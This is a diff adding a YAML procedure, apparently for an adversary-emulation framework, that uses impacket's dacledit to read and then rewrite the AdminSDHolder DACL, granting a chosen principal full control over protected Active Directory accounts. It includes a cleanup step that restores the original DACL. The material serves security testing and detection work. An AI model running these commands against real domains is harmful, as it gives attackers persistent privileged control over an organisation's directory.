@@ -1,0 +1,76 @@
+---
+api_version: 2.0
+uuid: 86a7d977-b6d0-4b9b-941f-3c036dc0ef6e
+name: Modify AdminSDHolder DACL
+authors:
+  - isaac_fletcher
+description: |
+  Reads and then modifies the DACL on the AdminSDHolder container. First reads
+  the current DACL for visibility, then grants a target principal full control
+  (GenericAll) over all protected Active Directory accounts and groups.
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0003 Persistence
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1098 Account Manipulation
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: target_principal
+    description: The sAMAccountName of the principal to grant GenericAll on AdminSDHolder
+  - name: backup_path
+    description: Path to store the DACL backup file created by dacledit
+    default: /tmp/adminsdholder_dacledit.bak
+steps:
+  - name: setup_impacket
+    description: Install impacket
+    ttp: //utils/pip-install/ttp.yaml
+    args:
+      modules: "impacket"
+
+  - name: read_adminsdholder_dacl
+    description: Read the current DACL on the AdminSDHolder container
+    inline: |
+      TARGET_DN="CN=AdminSDHolder,CN=System,DC={{.Args.domain | replace "." ",DC="}}"
+
+      echo "Reading DACL on ${TARGET_DN}"
+      dacledit.py -target-dn "${TARGET_DN}" \
+        -action read \
+        -dc-ip '{{.Args.dc}}' \
+        '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}'
+
+  - name: write_adminsdholder_dacl
+    description: Grant GenericAll to the target principal on the AdminSDHolder container
+    inline: |
+      TARGET_DN="CN=AdminSDHolder,CN=System,DC={{.Args.domain | replace "." ",DC="}}"
+
+      echo "Writing GenericAll ACE for {{.Args.target_principal}} on ${TARGET_DN}"
+      dacledit.py -target-dn "${TARGET_DN}" \
+        -principal '{{.Args.target_principal}}' \
+        -action write -rights FullControl \
+        -file '{{.Args.backup_path}}' \
+        -dc-ip '{{.Args.dc}}' \
+        '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}'
+    cleanup:
+      inline: |
+        echo "Restoring original DACL on AdminSDHolder from backup"
+        dacledit.py -target-dn "CN=AdminSDHolder,CN=System,DC={{.Args.domain | replace "." ",DC="}}" \
+          -action restore -file '{{.Args.backup_path}}' \
+          -dc-ip '{{.Args.dc}}' \
+          '{{.Args.domain}}/{{.Args.username}}:{{.Args.password}}'
+
+        echo "Cleaning up backup files"
+        rm -f '{{.Args.backup_path}}' dacledit-*.bak
